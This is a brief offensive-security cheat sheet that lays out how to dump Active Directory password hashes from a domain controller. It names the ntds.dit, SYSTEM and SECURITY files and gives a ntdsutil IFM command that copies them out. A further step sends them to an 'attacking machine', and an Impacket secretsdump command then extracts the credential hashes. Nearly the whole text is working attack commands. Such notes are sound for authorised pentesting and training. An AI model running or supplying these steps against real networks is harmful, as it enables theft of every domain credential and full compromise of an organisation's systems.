# DUMP DOMAIN CONTROLLER HASHES LOCALLY WITH NTDSUTIL

## required files: 

### 1) C:\windows\NTDS\ntds.dit

### 2) C:\windows\system32\config\SYSTEM

### 3) C:\windows\system32\config\SECURITY

#### 1) powershell "ntdsutil.exe 'ac i ntds' 'ifm' 'create full c:\temp' q q"

#### 2) Transfer them to attacking machine

#### 3) python3 Impacket-Secretsdump.py -security /path/to/SECURITY -system /path/to/SYSTEM -ntds path/to/ntds.dit local
